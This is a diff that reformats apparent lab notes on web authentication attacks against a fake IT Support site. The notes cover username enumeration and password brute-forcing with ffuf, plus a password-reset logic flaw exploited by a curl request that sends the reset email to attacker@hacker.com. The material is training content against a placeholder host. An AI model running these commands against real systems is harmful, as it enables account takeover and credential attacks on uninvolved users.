@@ -4,10 +4,10 @@
 * Website error messages are great resource for collating information to build list of valid usernames. 
 
 1. Go to the fake IT Support website’s signup page.
-2. Use the form to create a new user account.
-3. Enter the username 'admin' and fill in the other form fields with fake information.
-4. This produces an 'An account with this username already exists' error.
-5. Use the existence of the error message to produce a list of valid usernames already signed up on the system by using ffuf.
+2. Use form to create a new user account.
+3. Enter username 'admin' and fill in the other form fields with fake information.
+4. Produces "An account with this username already exists" error.
+5. Use existence of the error message to produce list of valid usernames already signed up on the system.
 ```
 ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists"
 ```
@@ -15,8 +15,8 @@ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "user
    * `-X` specifies request method.
      * GET request by default.
    * `-d` specifies data to be sent.
-     * `username` set to value of "FUZZ".
-     * "FUZZ" keyword signifies where contents from wordlist will be inserted in request.
+     * `username` set to value of `FUZZ`.
+     * `FUZZ` keyword signifies where contents from wordlist will be inserted in request.
   * `-H` adds additional headers to the request.
     * `Content-Type` is set so the web server knows that form data is being sent.
   * `-u` specifies URL that requests are made to.
@@ -25,38 +25,42 @@ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "user
 ## Brute Force
 * Automated process that tries a list of commonly used passwords against either a single username or a list of usernames.
 
-> 1.Brute force the fake IT Support website’s signup page.
-> 2. Run `ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200`
-> * Make sure the terminal is in the same directory as the `valid_usernames.txt` file when running the `ffuf` command.
->  * `FUZZ` keyword now needs to specify custom keywords because multiple wordlists are being used.
->    * `W1` for the list of valid usernames.
->    * `W2` for the list of passwords to try.
-> * `-w` specifies the multiple wordlists but are separated with a comma.
-> * `-fc` used to check for an HTTP status code other than `200` (a positive match).
+1.Brute force the fake IT Support website’s signup page.
+* Make sure the terminal is in the same directory as the `valid_usernames.txt` file when running the `ffuf` command.
+```
+ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200
+```
+* `FUZZ` keyword now needs to specify custom keywords because multiple wordlists are being used.
+* `W1` for the list of valid usernames.
+* `W2` for the list of passwords to try.
+* `-w` specifies the multiple wordlists but are separated with a comma.
+* `-fc` used to check for an HTTP status code other than `200` (a positive match).
 
 ## Logic Flaws
 * Occurs when the typical logical path of an application is either bypassed, circumvented or manipulated by a hacker.
 * These can exist in any area of a website including authentication processes.
 
-> 1. Examine the 'Reset Password' function of the fake IT Support website.
-> 2. This has a form asking for the email address associated with the account on which to perform the password reset.
-> 3. An 'Account not found from supplied email address' error message is received if an invalid email is entered.
->    * Use the valid email address `robert@acmeitsupport.thm`.
-> 5. The second stage of the reset form asks for the username associated with the login email address.
->    * Enter `robert` as the username.
-> 7. Press the 'Check Username' button.
-> 8. Message confirms that a password reset email has been sent to `robert@acmeitsupport.thm`.
->    * Username is submitted in a `POST` field to the web server and mail address is sent in the query string request as a `GET` field.
-> 11. Manually make a request to the web server: `curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'`
->     * `-H` adds an additional header to the request.
->     * `Content-Type` set to `application/x-www-form-urlencoded`.
->        * This lets the web server know that form data is being sent so it properly understands the request.
-> 16. The user account is retrieved using the query string in this application.
-> 17. However, the password reset email is sent using the data found in the `$_REQUEST` PHP variable.
->     * `$_REQUEST` is an array that contains data received from the query string and `POST` data.
->     * Application logic for `$_REQUEST` favours `POST` data fields over the query string if the same key name is used for both the query string and 'POST' data
->     * Because of this where the password reset email gets delivered to can be controlled if another `email` parameter is added to the 'POST' form:
->       * `curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'`
+1. Examine the 'Reset Password' function of the fake IT Support website.
+2. This has a form asking for the email address associated with the account on which to perform the password reset.
+3. An 'Account not found from supplied email address' error message is received if an invalid email is entered.
+   * Use the valid email address `robert@acmeitsupport.thm`.
+5. The second stage of the reset form asks for the username associated with the login email address.
+   * Enter `robert` as the username.
+7. Press the 'Check Username' button.
+8. Message confirms that a password reset email has been sent to `robert@acmeitsupport.thm`.
+   * Username is submitted in a `POST` field to the web server and mail address is sent in the query string request as a `GET` field.
+11. Manually make a request to the web server: `curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'`
+    * `-H` adds an additional header to the request.
+      * `Content-Type` set to `application/x-www-form-urlencoded`.
+      * This lets the web server know that form data is being sent so it properly understands the request.
+16. The user account is retrieved using the query string in this application.
+17. However, the password reset email is sent using the data found in the `$_REQUEST` PHP variable.
+    * `$_REQUEST` is an array that contains data received from the query string and `POST` data.
+    * Application logic for `$_REQUEST` favours `POST` data fields over the query string if the same key name is used for both the query string and 'POST' data
+    * Because of this where the password reset email gets delivered to can be controlled if another `email` parameter is added to the 'POST' form.
+```
+curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
+```
 
 > 1. Create another account in the customer section.
 >    * Doing so provides a unique email address that can be used to create support tickets.
